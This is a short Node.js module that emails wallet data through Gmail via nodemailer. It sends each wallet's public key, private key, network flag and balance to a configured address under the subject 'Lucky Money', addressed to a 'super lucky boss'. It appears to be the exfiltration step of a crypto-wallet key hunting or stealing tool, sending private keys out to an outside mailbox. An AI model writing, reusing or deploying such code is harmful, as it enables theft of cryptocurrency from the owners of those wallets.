require('dotenv').config()
const nodemailer = require('nodemailer')

const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: process.env.EMAIL,
    pass: process.env.PASSWORD,
  },
})

module.exports = {
  send: (money) => {
    let content = 
`Hello my super lucky boss,

pubk: ${money.pubk}
prik: ${money.prik}
native: ${money.native}
balnce: ${money.balnce}
`
    //code ===  0x0 -> native
    //else -> !native

    const options = {
      from: process.env.EMAIL,
      to: process.env.EMAIL_TO,
      subject: "Lucky Money",
      text: content,
    }
    
    return transporter.sendMail(options)
  },
}